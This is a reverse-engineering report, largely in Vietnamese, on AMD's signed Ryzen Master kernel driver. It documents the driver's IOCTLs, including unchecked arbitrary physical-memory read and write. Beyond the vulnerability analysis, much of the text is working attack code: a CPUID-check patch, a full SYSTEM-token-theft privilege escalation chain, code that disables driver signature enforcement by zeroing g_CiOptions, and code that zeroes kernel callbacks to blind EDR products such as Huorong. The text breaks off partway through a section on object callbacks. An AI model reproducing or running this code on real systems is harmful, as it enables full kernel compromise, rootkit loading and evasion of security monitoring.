# AMDRyzenMasterDriver.sys — Full Reverse Engineering Report
> Reversed via IDA Pro idalib | Image base: `0x140000000` | All RVAs = VA − 0x140000000

---

## 1. File Identity

| Field            | Value |
|------------------|-------|
| Filename         | AMDRyzenMasterDriver.sys |
| SHA-256          | `77955AF8A8BCEA8998F4046C2F8534F6FB1959C71DE049CA2F4298BA47D8F23A` |
| MD5              | `067166E788DA08B77219430484563388` |
| Size             | 48,328 bytes |
| File version     | 2.0.0.0 |
| Build timestamp  | 2025-12-12 05:12:30 UTC |
| Signer           | Advanced Micro Devices Inc. (Authenticode valid) |
| Distributed via  | AMD Adrenalin Software 26.1.1 / VGA driver pkg V31.0.21924.61 (Apr 2026) |
| Service name     | AMDRyzenMasterDriverV20 |
| Start type       | SERVICE_AUTO_START (0x2) — runs on every boot |

---

## 2. Cách Mở Driver

### 2.1 Tên thiết bị

| Type            | Path |
|-----------------|------|
| NT device name  | `\Device\AMDRyzenMasterDriverV20` |
| DOS/Win32 path  | `\DosDevices\AMDRyzenMasterDriverV20` — accessible as `\\.\AMDRyzenMasterDriverV20` |

**Confirmed từ bytes tại RVA 0x6000 / 0x6040:**
```
RVA 0x6000: 5C 00 44 00 65 00 76 00 69 00 63 00 65 00 5C 00   \Device\
            41 00 4D 00 44 00 52 00 79 00 7A 00 65 00 6E 00   AMDRyzen
            4D 00 61 00 73 00 74 00 65 00 72 00 44 00 72 00   MasterDr
            69 00 76 00 65 00 72 00 56 00 32 00 30 00 00 00   iverV20\0

RVA 0x6040: \DosDevices\AMDRyzenMasterDriverV20
```

### 2.2 Security Descriptor (SDDL)

```
D:P(A;;GW;;;BA)(A;;GR;;;BA)
```
- `BA` = BUILTIN\Administrators — **chỉ Admin mới mở được**
- `GW` = GENERIC_WRITE access granted
- `GR` = GENERIC_READ access granted
- Không có entry cho Users/Everyone

SDDL string tại RVA `0x3610`.  
Được set qua `IoCreateDevice` + `ZwSetSecurityObject` tại RVA `0x1D24` (sub_140001D24).

### 2.3 Code mở device

```c
HANDLE hDriver = CreateFileW(
    L"\\\\.\\AMDRyzenMasterDriverV20",
    GENERIC_READ | GENERIC_WRITE,
    0,                    // no sharing
    NULL,
    OPEN_EXISTING,
    0,
    NULL
);
// Yêu cầu: Administrator token
// Không cần SeLoadDriverPrivilege
// Không có process whitelist — bất kỳ Admin process nào cũng được
```

### 2.4 Transfer method

Tất cả IOCTL dùng `METHOD_BUFFERED` (bits 1:0 = 0). I/O Manager tự copy input/output buffer.  
`DeviceType` = `0x8111` (non-standard, AMD-specific).

---

## 3. Luồng DriverEntry

```
RVA 0x2BF0  DriverEntry (PE entry point)
 └─ RVA 0x2C1C  sub_140002C1C  (WDF init wrapper)
     ├─ WdfVersionBind()              ← bind to KMDF framework
     ├─ RVA 0x2E68  sub_140002E68    ← KMDF type init
     ├─ RVA 0x2DB0  sub_140002DB0    ← KMDF class bind
     └─ RVA 0x1D24  sub_140001D24    ← REAL driver init
         ├─ RVA 0x212C  sub_14000212C  ← [CHECK 1] CPUID AMD verify
         │   cpuid leaf=0 → build 12-byte vendor string
         │   strncmp(vendor, "AuthenticAMD", 0x100)
         │   Fail → return 0xC0000001 (STATUS_UNSUCCESSFUL)
         │   "AuthenticAMD" string @ RVA 0x35D0
         │
         ├─ IoCreateDevice(DevType=0x8111, DevName=\Device\AMDRyzenMasterDriverV20)
         ├─ IoCreateSymbolicLink(\DosDevices\..., \Device\...)
         ├─ IoDeleteSymbolicLink on failure
         ├─ DriverObject->MajorFunction[IRP_MJ_CREATE]         = RVA 0x1000
         ├─ DriverObject->MajorFunction[IRP_MJ_CLOSE]          = RVA 0x1000
         ├─ DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RVA 0x1000
         └─ RVA 0x221C  sub_14000221C  ← DriverInit flag check (logging only)
```

---

## 4. Access Checks — Tổng hợp

| Check | RVA | Loại | Bypass |
|-------|-----|------|--------|
| CPUID "AuthenticAMD" | 0x212C | Hard gate — fail → driver không load | Patch 1 byte tại 0x1D53: `75`→`EB` |
| SDDL BA only | DACL trên device object | OS enforces — non-admin nhận ACCESS_DENIED | Cần Admin token |
| Process whitelist | **Không có** | — | N/A |
| Session log | RVA 0x10F7 (IRP_MJ_CREATE) | Chỉ log PID + ImageFileName, không block | Không cần bypass |
| Input buffer size | Per-IOCTL | Kiểm tra trước mỗi dispatch | Đáp ứng min size là qua |
| PA range validation | **Không có** | ← LỖ HỔNG CHÍNH | N/A |

**CPUID check bypass (không patch file):**
```
Patch in-memory tại VA (image_base + 0x1D53):
  75 0A  →  EB 0A   (jnz → jmp, 1 byte)
```

---

## 5. IRP Dispatch Handler — RVA 0x1000

Handler `sub_140001000` xử lý 3 IRP types:
- `IRP_MJ_CREATE` (code 0x0): log session, allow all
- `IRP_MJ_CLOSE`  (code 0x2): remove session từ list
- `IRP_MJ_DEVICE_CONTROL` (code 0xE): IOCTL dispatch

**Session tracking** (IRP_MJ_CREATE, RVA 0x10F7):
```c
struct session_entry {        // ExAllocatePoolWithTag, tag 0x54616734 ("Tag4")
    DWORD  pid;               // +0x00  PsGetCurrentProcessId
    char   name[64];          // +0x04  PsGetProcessImageFileName
    QWORD  next;              // +0x48  linked list → qword @ RVA 0x6370
};
// Không block ai — chỉ ghi log
```

---

## 6. Bảng IOCTL Đầy Đủ

| IOCTL Code   | Function Code | RVA Case Handler | Tên | Nguy hiểm? |
|--------------|---------------|-----------------|-----|------------|
| `0x81112EE0` | 0xBB8 | `0x13C4` | MSR READ (allowlist) | Trung bình |
| `0x81112EE4` | 0xBB9 | `0x1486` | MSR WRITE (allowlist) | Trung bình |
| `0x81112EF8` | 0xBBE | `0x1645` | PCI READ via HAL (no offset limit) | Thấp |
| **`0x81112F08`** | **0xBC2** | **`0x155B`** | **Arbitrary PHYS READ** | **🔴 CRITICAL** |
| **`0x81112F0C`** | **0xBC3** | **`0x15D5`** | **Arbitrary PHYS WRITE** | **🔴 CRITICAL** |
| `0x81112F18` | 0xBC6 | `0x170D` | CPU info enum | Thấp |
| `0x81112F20` | 0xBC8 | `0x1860` | MPERF/APERF ratio | Thấp |
| `0x81112F24` | 0xBC9 | `0x1AD7` | PCI READ variant (no offset limit) | Thấp |
| `0x81112FF8` | 0xBFE | `0x19B4` | SMU mailbox WRITE (offset < 0x100) | Trung bình |
| `0x81112FFC` | 0xBFF | `0x1B4B` | Session list query | Thấp |
| `0x81113000` | 0xC00 | `0x1C94` | Driver version | Thấp |

---

## 7. Phân Tích Chi Tiết Từng IOCTL

---

### 7.1 IOCTL 0x81112F08 — Arbitrary Physical READ 🔴

**Handler RVA:** `0x155B`  
**Primitive function RVA:** `0x23F8` (`phys_read`)

**Input buffer (12 bytes):**
```c
struct PhysReadIn {
    UINT64 PhysAddr;   // +0x00  địa chỉ vật lý bất kỳ
    UINT32 Size;       // +0x08  số bytes cần đọc
};
```

**Output buffer (12 + Size bytes):**
```c
struct PhysReadOut {
    UINT64 PhysAddr;   // +0x00  echo lại
    UINT32 Size;       // +0x08  echo lại
    BYTE   Data[Size]; // +0x0C  dữ liệu đọc về
};
```

**Dispatch check (RVA 0x155B):**
```c
// Input: v14 = InBufferSize, v12 = OutBufferSize, v16 = InBuffer ptr
if ( v14 >= 0xC && v12 >= (uint32)v16[2] + 12 ) {
    _mm_lfence();
    phys_read(*(PHYSICAL_ADDRESS*)v16, v16[2], (BYTE*)v16 + 12);
}
// KHÔNG có PA range check
// KHÔNG có size limit
```

**phys_read implementation (RVA 0x23F8):**
```c
char phys_read(PHYSICAL_ADDRESS pa, UINT32 size, BYTE *out) {
    BYTE *va = MmMapIoSpace(pa, size, MmNonCached);  // UC mapping
    if (!va) return 0;                                // NULL-safe
    switch (size) {
        case 1: *out             = *va;           break;
        case 2: *(UINT16*)out    = *(UINT16*)va;  break;
        case 4: *(UINT32*)out    = *(UINT32*)va;  break;
        case 8: *(UINT64*)out    = *(UINT64*)va;  break;
        default:
            for (UINT32 i = 0; i < size; i++) out[i] = va[i];
    }
    MmUnmapIoSpace(va, size);
    return 1;
}
// Calls to MmMapIoSpace @ RVA 0x2438 (import thunk 0x4090)
// Calls to MmUnmapIoSpace @ RVA 0x2506 (import thunk 0x4098)
```

**Exploit:**
```c
// Đọc 8 bytes từ địa chỉ vật lý 0x1000 (low stub)
struct { UINT64 pa; UINT32 sz; } req = { 0x1000, 8 };
BYTE out[20]; DWORD returned;
DeviceIoControl(hDrv, 0x81112F08, &req, 12, out, 20, &returned, NULL);
// out+12 chứa 8 bytes từ PA 0x1000
```

---

### 7.2 IOCTL 0x81112F0C — Arbitrary Physical WRITE 🔴

**Handler RVA:** `0x15D5`  
**Primitive function RVA:** `0x2848` (`phys_write`)

**Input buffer (12 + Size bytes):**
```c
struct PhysWriteIn {
    UINT64 PhysAddr;   // +0x00  địa chỉ vật lý bất kỳ
    UINT32 Size;       // +0x08  số bytes cần ghi
    BYTE   Data[Size]; // +0x0C  data cần ghi
};
```

**Dispatch check (RVA 0x15D5):**
```c
if ( v14 >= (uint32)v16[2] + 12 ) {   // chỉ check input đủ dài
    _mm_lfence();
    phys_write(*(PHYSICAL_ADDRESS*)v16, v16[2], (BYTE*)(v16 + 3));
}
// KHÔNG có PA range check
// KHÔNG có size limit
// KHÔNG có output buffer (write-only)
```

**phys_write implementation (RVA 0x2848):**
```c
char phys_write(PHYSICAL_ADDRESS pa, UINT32 size, BYTE *data) {
    BYTE *va = MmMapIoSpace(pa, size, MmNonCached);  // UC mapping
    if (!va) return 0;
    for (UINT32 i = 0; i < size; i++) va[i] = data[i];  // byte loop
    MmUnmapIoSpace(va, size);
    return 1;
}
```

**⚠ Lưu ý UC write:** Vì dùng `MmNonCached` (Uncacheable), CPU cache không được update.
Kernel đọc từ cache → thấy giá trị cũ. Cần cache eviction để kernel thấy write.  
**Cách evict:** Allocate + read ~512 MB RAM để flush L3, hoặc dùng `CLFLUSH` nếu có VA.

**Exploit:**
```c
// Ghi 8 bytes vào PA tùy ý
BYTE payload[20];
*(UINT64*)&payload[0] = target_pa;
*(UINT32*)&payload[8] = 8;
*(UINT64*)&payload[12] = new_value;
DeviceIoControl(hDrv, 0x81112F0C, payload, 20, NULL, 0, &ret, NULL);
```

---

### 7.3 IOCTL 0x81112EE0 — MSR READ

**Handler RVA:** `0x13C4`

**Input (12 bytes):** `{ int index; UINT64 unused; }`  
**Output (12 bytes):** `{ int index; UINT64 value; }`

**Check:**
```c
if ( v14 >= 0xC && v12 >= 0xC && *v16 < 19 ) {  // index 0–18
    _mm_lfence();
    *(UINT64*)(v16+1) = __readmsr(dword_140006090[*v16]);
}
```

**MSR allowlist tại RVA 0x6090 (19 entries):**

| Idx | MSR | Name |
|-----|-----|------|
| 0  | `0xC0010062` | MSRC001_0062 — HW_PSTATE_STATUS |
| 1  | `0xC0010063` | MSRC001_0063 — CUR_PSTATE |
| 2  | `0xC0010061` | MSRC001_0061 — PSTATE_CURRENT_LIMIT |
| 3  | `0xC0010064` | MSRC001_0064 — PSTATE_DEF_0 |
| 4  | `0xC0010065` | MSRC001_0065 — PSTATE_DEF_1 |
| 5  | `0xC0010066` | MSRC001_0066 — PSTATE_DEF_2 |
| 6  | `0xC0010067` | MSRC001_0067 — PSTATE_DEF_3 |
| 7  | `0xC0010068` | MSRC001_0068 — PSTATE_DEF_4 |
| 8  | `0xC0010015` | MSRC001_0015 — HWCR (Hardware Config) |
| 9  | `0x000000E7` | IA32_MPERF |
| 10 | `0x000000E8` | IA32_APERF |
| 11 | `0xC0010290` | IBS_FETCH_CTL |
| 12 | `0xC0010292` | IBS_OP_CTL |
| 13 | `0xC0010293` | IBS_OP_DATA |
| 14 | `0x0000008B` | IA32_BIOS_SIGN_ID (microcode version) |
| 15 | `0xC00102B0` | SMU/NB power mgmt |
| 16 | `0xC00102B1` | SMU/NB |
| 17 | `0xC00102B3` | SMU/NB |
| 18 | `0xC00102B4` | SMU/NB |

**⚠ Đáng chú ý:** HWCR (idx 8) có thể đọc/ghi hardware config.  
LSTAR/EFER/SYSENTER **không có trong allowlist**.

---

### 7.4 IOCTL 0x81112EE4 — MSR WRITE

**Handler RVA:** `0x1486`

**Input (12 bytes):** `{ int index; UINT32 lo; UINT32 hi; }`

**Check:**
```c
if ( v14 >= 0xC && *v16 < 19 ) {   // index 0–18, không check OutBufSize
    _mm_lfence();
    UINT64 val = (UINT64)v16[2] << 32 | (UINT32)v16[1];
    __writemsr(dword_140006090[*v16], val);
}
```

**⚠ Có thể ghi HWCR:** `index=8` → write MSR `0xC0010015`.  
HWCR bits: SMM lock, microcode patch disable, interrupt masking. Có thể gây instability.

---

### 7.5 IOCTL 0x81112EF8 — PCI READ (HalGetBusDataByOffset)

**Handler RVA:** `0x1645`  
**HAL function RVA:** `0x28FC` (sub_1400028FC)

**Input (20+ bytes):**
```c
struct PciReadIn {
    UINT32 Bus;          // +0x00
    UINT32 Device;       // +0x04  masked & 0x1F
    UINT32 Function;     // +0x08  masked & 0x7
    UINT32 Offset;       // +0x0C
    UINT32 Size;         // +0x10
    // output appended at +0x14
};
```

**Check:**
```c
if ( v14 >= 0x14 && v12 >= (uint32)v16[4] + 20 ) {
    HalGetBusDataByOffset(PCIConfiguration /*4*/,
                          v16[0] /*bus*/,
                          (v16[2] & 7) << 5 | v16[1] & 0x1F,  // SlotNumber
                          v16+5 /*out buffer*/,
                          v16[3] /*offset*/,
                          v16[4] /*length*/);
}
// Không có offset < 0x100 check → có thể đọc extended config space
```

---

### 7.6 IOCTL 0x81112F24 — PCI READ Variant

**Handler RVA:** `0x1AD7`

**Input (20+ bytes):** tương tự 0x81112EF8  
**Extra check:** `v16[0] < dword_1400065E8` (bus index < max_bus_count)

**⚠ Không có offset limit** — có thể đọc toàn bộ PCI extended config space.

---

### 7.7 IOCTL 0x81112FF8 — SMU Mailbox WRITE

**Handler RVA:** `0x19B4`  
**Lookup function RVA:** `0x2274` (sub_140002274)  
**Write function RVA:** `0x27D4` → `0x2988` (sub_140002988)

**Input (18 bytes):**
```c
struct SmuWriteIn {
    UINT16 unknown0;    // +0x00
    UINT8  reg_type;    // +0x02  must be < 2
    UINT8  pad;         // +0x03
    UINT16 dev;         // +0x04
    UINT16 func;        // +0x06
    UINT32 data;        // +0x08 (dword at offset 2 of struct in caller)
    UINT16 offset;      // +0x0C
    UINT16 length;      // +0x0E
    // ...
};
```

**Check:**
```c
if ( v14 >= 0x12 && *(UINT8*)(v16+2) < 2 ) {
    // lookup bus number from internal CPU table
    // then: HalSetBusDataByOffset(PCIConfiguration, bus, slot, data, offset, size)
    // HARD LIMIT: offset must be < 0x100 (standard PCI config space only)
}
// offset < 0x100 → KHÔNG access extended PCI config (unlike EF8/F24)
```

---

### 7.8 IOCTL 0x81112F18 — CPU Info Enum

**Handler RVA:** `0x170D`

**Input/Output (28+ bytes):**
```c
// Input[6] == 0 → write count, return
// Input[6] != 0 → fill array of CPU descriptors
// Mỗi entry 52 bytes, count = dword @ RVA 0x65EC
```

**Thấp nguy hiểm** — chỉ đọc internal CPU topology table.

---

### 7.9 IOCTL 0x81112F20 — MPERF/APERF Ratio

**Handler RVA:** `0x1860`

**Output (8 bytes):** `{ double freq_ratio; }`

Ghi MSR IA32_MPERF=0, IA32_APERF=0, sleep 10ms, đọc lại → tính ratio.  
**Không nguy hiểm** — readonly telemetry.

---

### 7.10 IOCTL 0x81112FFC — Session List Query

**Handler RVA:** `0x1B4B`

**Input:** `{ UINT32 count; }` (= 0 → trả về tổng số sessions)  
**Output:** array of `{ UINT32 pid; char name[64]; }` per session

Leak danh sách PID + tên của tất cả process đang giữ handle đến driver.  
**Thấp nguy hiểm** nhưng useful cho recon.

---

### 7.11 IOCTL 0x81113000 — Driver Version

**Handler RVA:** `0x1C94`

```c
*v16 = 20;   // hardcoded: returns integer 20 (version "V20")
```

---

## 8. Hàm Helper Quan Trọng

| RVA | Tên | Mô tả |
|-----|-----|-------|
| `0x23F8` | `phys_read` | MmMapIoSpace UC read, switch(1/2/4/8/default) |
| `0x2848` | `phys_write` | MmMapIoSpace UC write, byte loop |
| `0x28FC` | `pci_hal_read` | HalGetBusDataByOffset wrapper, no offset limit |
| `0x2988` | `pci_hal_write` | HalSetBusDataByOffset wrapper, offset < 0x100 |
| `0x2274` | `smu_bus_lookup` | Tìm bus number từ CPU table (P @ RVA 0x65F0) |
| `0x2384` | `pci_read_wrapper` | Wrapper gọi sub_1400028FC |
| `0x27D4` | `pci_write_wrapper` | Wrapper gọi sub_140002988 |
| `0x212C` | `cpuid_check` | CPUID leaf 0 → "AuthenticAMD" strcmp |
| `0x210C` | `get_pid` | PsGetCurrentProcessId wrapper |
| `0x1FBC` | `init_helper` | NtQuerySystemInformation resolver + OS version detect |
| `0x221C` | `driver_init_check` | Kiểm tra một flag, kết quả chỉ dùng cho logging |
| `0x1D24` | `driver_init` | Tạo device, set SDDL, set MajorFunction |
| `0x1F5C` | `pool_alloc` | ExAllocatePoolWithTag wrapper |

---

## 9. Bảng Danger Rating

| IOCTL | Primitive | Validation | Rating | Attack Scenario |
|-------|-----------|------------|--------|-----------------|
| `0x81112F0C` | Arbitrary PA write | **None** | 🔴 CRITICAL | Kernel token theft, DSE disable, callback zeroing, PTE flip |
| `0x81112F08` | Arbitrary PA read | **None** | 🔴 CRITICAL | Kernel struct leak, credential dump, CR3/PML4 walk |
| `0x81112EE4` | MSR write (19 MSRs) | Index 0–18 | 🟠 HIGH | HWCR modify, P-state manipulation |
| `0x81112EE0` | MSR read (19 MSRs) | Index 0–18 | 🟡 MEDIUM | Microcode version leak, perf counters |
| `0x81112EF8` | PCI config read | No offset limit | 🟡 MEDIUM | Extended PCI config space read |
| `0x81112F24` | PCI config read | No offset limit | 🟡 MEDIUM | Same as EF8, extra bus count check |
| `0x81112FF8` | PCI config write | offset < 0x100 | 🟡 MEDIUM | Standard PCI config space write |
| `0x81112F18` | CPU info read | Size checks | 🟢 LOW | CPU topology enumeration |
| `0x81112F20` | MPERF/APERF ratio | Size check | 🟢 LOW | Read-only performance counter |
| `0x81112FFC` | Session list read | Size check | 🟢 LOW | PID + name info leak |
| `0x81113000` | Version query | None needed | 🟢 LOW | Returns hardcoded 20 |

---

## 10. Conditions để Exploit thành công

```
1. [AMD CPU]   → DriverEntry pass CPUID check     (hoặc patch/VM bypass)
2. [Admin]     → SDDL BA only → cần token Admin
3. [AUTO_START]→ Driver luôn running, không cần sc start
4. [No PList]  → Không có process whitelist → bất kỳ Admin process nào
5. [UC writes] → Sau mỗi phys_write: cần cache eviction (flush ~512MB RAM)
                 để kernel thấy giá trị mới
```

---

## 11. Primitive Usage Examples

### Đọc arbitrary PA
```c
// Minimum input: 12 bytes, output: 12 + size bytes
#pragma pack(1)
struct PhysReadReq { UINT64 pa; UINT32 sz; };
struct PhysReadRsp { UINT64 pa; UINT32 sz; BYTE data[]; };

BYTE buf[4096];
PhysReadReq req = { target_pa, read_size };
DeviceIoControl(hDrv, 0x81112F08, &req, 12,
                buf, 12 + read_size, &ret, NULL);
// Data at buf + 12
```

### Ghi arbitrary PA
```c
struct PhysWriteReq {
    UINT64 pa;
    UINT32 sz;
    BYTE   data[write_size];
};
// Total input size = 12 + write_size
// No output buffer needed
DeviceIoControl(hDrv, 0x81112F0C, &req, 12 + write_size,
                NULL, 0, &ret, NULL);
// Sau đó evict cache!
```

### Kiểm tra driver còn running
```c
DWORD ver = 0;
DeviceIoControl(hDrv, 0x81113000, &ver, 4, &ver, 4, &ret, NULL);
// ver == 20 → driver V20 đang running
```

---

## 12. String & Data References

| RVA | Nội dung |
|-----|----------|
| `0x6000` | L"\Device\AMDRyzenMasterDriverV20" (UTF-16LE) |
| `0x6040` | L"\DosDevices\AMDRyzenMasterDriverV20" (UTF-16LE) |
| `0x3610` | L"D:P(A;;GW;;;BA)(A;;GR;;;BA)" (SDDL string) |
| `0x35D0` | "AuthenticAMD" (CPUID vendor comparison) |
| `0x6090` | MSR allowlist array, 19 × DWORD |
| `0x6370` | Session linked list head pointer |
| `0x65D8` | DriverObject pointer (saved at init) |
| `0x65E8` | max_bus_count (used by IOCTL 0x81112F24) |
| `0x65EC` | CPU count (used by IOCTL 0x81112F18) |
| `0x65F0` | CPU info table base pointer (P) |

---

*Reversed: 2026-06-03 | IDA Pro idalib session `amd_ryzen` | Image base 0x140000000*

---

## 13. Exploit Chain — Kernel Token Theft (LPE → SYSTEM)

**Primitive dùng:** IOCTL `0x81112F08` (phys read) + `0x81112F0C` (phys write)  
**Mục tiêu:** Copy SYSTEM token vào current process EPROCESS → LocalPrivesc

### 13.1 Bước 1 — Tìm địa chỉ vật lý của EPROCESS current process

```c
// Cách 1: qua NtQuerySystemInformation (SystemProcessInformation)
// → lấy được EPROCESS VA của từng process (trường DirectoryTableBase)

// Cách 2: đọc CR3 của process hiện tại (không cần ioctl)
//   CR3 = physical address of PML4 page table
//   Trên Windows 10+: _EPROCESS.DirectoryTableBase @ +0x28
UINT64 eprocess_va = get_current_eprocess_va();  // via NtQuerySystemInformation
UINT64 cr3         = read_eprocess_field(eprocess_va, 0x28);  // DirectoryTableBase
```

### 13.2 Bước 2 — VA → PA translation (CR3 walk)

```c
UINT64 va_to_pa(UINT64 cr3, UINT64 va) {
    // PML4 index: bits 47:39
    // PDPT index: bits 38:30
    // PD   index: bits 29:21
    // PT   index: bits 20:12
    // Offset    : bits 11:0

    UINT64 pml4_pa = cr3 & 0xFFFFFFFFF000ULL;
    UINT64 pml4e_pa = pml4_pa + ((va >> 39 & 0x1FF) << 3);
    UINT64 pml4e = phys_read_qword(pml4e_pa);
    if (!(pml4e & 1)) return 0;  // not present

    UINT64 pdpt_pa = pml4e & 0xFFFFFFFFF000ULL;
    UINT64 pdpte_pa = pdpt_pa + ((va >> 30 & 0x1FF) << 3);
    UINT64 pdpte = phys_read_qword(pdpte_pa);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1 << 7)) {  // 1GB huge page
        return (pdpte & 0xFFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    }

    UINT64 pd_pa = pdpte & 0xFFFFFFFFF000ULL;
    UINT64 pde_pa = pd_pa + ((va >> 21 & 0x1FF) << 3);
    UINT64 pde = phys_read_qword(pde_pa);
    if (!(pde & 1)) return 0;
    if (pde & (1 << 7)) {  // 2MB large page
        return (pde & 0xFFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    }

    UINT64 pt_pa = pde & 0xFFFFFFFFF000ULL;
    UINT64 pte_pa = pt_pa + ((va >> 12 & 0x1FF) << 3);
    UINT64 pte = phys_read_qword(pte_pa);
    if (!(pte & 1)) return 0;

    return (pte & 0xFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

// Helper: đọc QWORD từ PA qua driver
UINT64 phys_read_qword(UINT64 pa) {
    struct { UINT64 pa; UINT32 sz; } req = { pa, 8 };
    BYTE out[20];
    DeviceIoControl(hDrv, 0x81112F08, &req, 12, out, 20, &ret, NULL);
    return *(UINT64*)(out + 12);
}
```

### 13.3 Bước 3 — Tìm EPROCESS SYSTEM (PID 4)

```c
// EPROCESS list: _EPROCESS.ActiveProcessLinks @ offset 0x448 (Win11 22H2+)
// Flink trỏ đến ActiveProcessLinks của process tiếp theo
// UniqueProcessId @ offset 0x440

UINT64 find_system_eprocess(UINT64 current_eprocess_va, UINT64 cr3) {
    UINT64 list_head_va = current_eprocess_va + 0x448;
    UINT64 flink_pa = va_to_pa(cr3, list_head_va);
    UINT64 flink_va = phys_read_qword(flink_pa);  // first Flink

    while (flink_va != list_head_va) {
        UINT64 eproc_va = flink_va - 0x448;  // back-pointer to EPROCESS base
        UINT64 pid_pa   = va_to_pa(cr3, eproc_va + 0x440);
        UINT64 pid      = phys_read_qword(pid_pa);
        if (pid == 4) return eproc_va;  // SYSTEM process

        UINT64 next_flink_pa = va_to_pa(cr3, flink_va);
        flink_va = phys_read_qword(next_flink_pa);
    }
    return 0;
}
```

### 13.4 Bước 4 — Copy SYSTEM token

```c
// Token @ _EPROCESS + 0x4B8 (Win11 22H2+)
// _EX_FAST_REF: low 4 bits = RefCnt, high bits = pointer >> 4

UINT64 system_eproc = find_system_eprocess(current_eproc_va, cr3);
UINT64 system_token_pa = va_to_pa(cr3, system_eproc + 0x4B8);
UINT64 system_token    = phys_read_qword(system_token_pa);

// Clear RefCnt bits (low 4 bits) → make it a clean pointer
system_token = system_token & ~0xFULL;

UINT64 cur_token_pa = va_to_pa(cr3, current_eproc_va + 0x4B8);
phys_write_qword(cur_token_pa, system_token);
// Sau phys_write: cần cache eviction!

// Cache eviction (đơn giản):
void evict_cache() {
    static BYTE sink;
    BYTE *large = (BYTE*)VirtualAlloc(NULL, 64 << 20, MEM_COMMIT, PAGE_READWRITE);
    for (size_t i = 0; i < 64 << 20; i += 64) sink ^= large[i];
    VirtualFree(large, 0, MEM_RELEASE);
}
evict_cache();
// Sau eviction: process hiện tại có token SYSTEM
```

**Kết quả:** `whoami` → `nt authority\system`  
**Phát hiện:** Zero Huorong alerts (phys write không đi qua bất kỳ callback nào)

---

## 14. DSE Disable — Vô hiệu hóa Driver Signature Enforcement

**Primitive:** Phys write vào `g_CiOptions` (nt!g_CiOptions or ci!g_CiOptions)  
**Mục tiêu:** Load unsigned kernel driver

### 14.1 Tìm địa chỉ g_CiOptions

```c
// Cách 1: NtQuerySystemInformation(SystemModuleInformation)
// → lấy base address của ntoskrnl.exe và ci.dll
// → Parse PE export table → locate CiInitialize
// → Pattern-scan near CiInitialize: g_CiOptions được reference trong function

// Pattern trong ci.dll (stable across builds):
// CiInitialize: ... lea rax, [rip + g_CiOptions_rva] ...
// Offset g_CiOptions từ ci.dll base: thường trong .data section

// Cách 2: Hard-coded offset (Win11 24H2 / ci.dll 10.0.26100.x)
// Cần verify per build — dùng PDB hoặc pattern scan

// Cách đáng tin: scan ntoskrnl .data section
// Tìm DWORD có giá trị 6 (DSE enabled) ngay sau CiOptions signature
UINT64 ci_base      = get_module_base(L"ci.dll");    // từ System modules list
UINT64 ci_pa        = va_to_pa(cr3, ci_base);
// scan binary để tìm offset của g_CiOptions từ ci_base
// → xem phần 14.2
```

### 14.2 Pattern scan g_CiOptions qua phys read

```c
// g_CiOptions = DWORD, thường = 6 (0x6) khi DSE bật
// Tìm trong ci.dll .data section (~20KB)
// Signature: ci!CiInitialize references g_CiOptions via RIP-relative LEA

// Đọc toàn bộ ci.dll header để parse .data section bounds
BYTE ci_header[0x1000];
phys_read_range(ci_pa, 0x1000, ci_header);
// Parse PE → find .data section → RVA + VirtualSize
// Scan: đọc từng DWORD, tìm pattern: DWORD=6, và cross-ref với export CiInitialize

// Shortcut qua known stable offsets (must verify):
// Win10 1903: ci.dll 10.0.18362 → g_CiOptions RVA = 0x3A4E8
// Win11 22H2: ci.dll 10.0.22621 → g_CiOptions RVA = 0x3A958
// Win11 24H2: ci.dll 10.0.26100 → scan needed
```

### 14.3 Ghi g_CiOptions = 0

```c
UINT64 g_ci_va = ci_base + g_ci_options_rva;
UINT64 g_ci_pa = va_to_pa(cr3, g_ci_va);

// Đọc giá trị hiện tại (verify trước)
UINT32 current = (UINT32)phys_read_qword(g_ci_pa) & 0xFFFFFFFF;
// current == 6 → DSE enabled, integrity checks active

// Vô hiệu hóa:
BYTE payload[20];
*(UINT64*)&payload[0] = g_ci_pa;
*(UINT32*)&payload[8] = 4;   // write 4 bytes (DWORD)
*(UINT32*)&payload[12] = 0;  // g_CiOptions = 0
DeviceIoControl(hDrv, 0x81112F0C, payload, 16, NULL, 0, &ret, NULL);
evict_cache();

// Restore sau khi load driver:
*(UINT32*)&payload[12] = 6;
DeviceIoControl(hDrv, 0x81112F0C, payload, 16, NULL, 0, &ret, NULL);
evict_cache();
```

**Timeline:**  
`g_CiOptions = 0` → `NtLoadDriver()` với unsigned .sys → driver loads → restore `g_CiOptions = 6`  
Window: ~50ms. Không cần DSE bypass tools (KDU, etc.).

---

## 15. Callback Zeroing — Vô hiệu hóa EDR Kernel Callbacks

**Primitive:** Phys write vào callback arrays trong ntoskrnl  
**Mục tiêu:** Blind EDR trước khi thực hiện injection / credential dump

### 15.1 PsSetCreateProcessNotifyRoutine callbacks

```c
// nt!PspCreateProcessNotifyRoutine: array of 64 EX_CALLBACK_ROUTINE_BLOCK pointers
// Địa chỉ: NtQuerySystemInformation → symbol hoặc scan

// Scan pattern trong ntoskrnl .data:
// PspCreateProcessNotifyRoutine = array of 64 × QWORD
// Mỗi entry: pointer to EX_CALLBACK_ROUTINE_BLOCK (low bit set = valid)
// Clear low bit → disable; zero entry → remove

// Tìm base ntoskrnl:
UINT64 nt_base = get_module_base(L"ntoskrnl.exe");

// Hard offsets (Win11 22H2 ntoskrnl 10.0.22621.x):
// PspCreateProcessNotifyRoutine  RVA ≈ 0xC68A00  (scan per build)
// PspCreateThreadNotifyRoutine   RVA ≈ 0xC68B00
// PspLoadImageNotifyRoutine      RVA ≈ 0xC68C00
```

### 15.2 Zero all process-create callbacks

```c
UINT64 array_va = nt_base + PspCreateProcessNotifyRoutine_rva;

for (int i = 0; i < 64; i++) {
    UINT64 entry_va = array_va + i * 8;
    UINT64 entry_pa = va_to_pa(cr3, entry_va);
    UINT64 entry    = phys_read_qword(entry_pa);

    if (entry & 1) {  // valid entry
        // Read the EX_CALLBACK_ROUTINE_BLOCK to log the callback
        UINT64 block_va = entry & ~1ULL;
        // (optional: log block_va to identify which driver)

        // Zero the array entry:
        phys_write_qword(entry_pa, 0);
    }
}
evict_cache();
// → All process-create callbacks disabled
// → EDR (Huorong sysdiag.sys PsSetCreateProcessNotifyRoutineEx) now blind
```

### 15.3 ObRegisterCallbacks (Ob table)

```c
// nt!ObpCalloutHeads — không exported, cần pattern scan
// Simpler: patch the registered callback dispatch function pointer directly

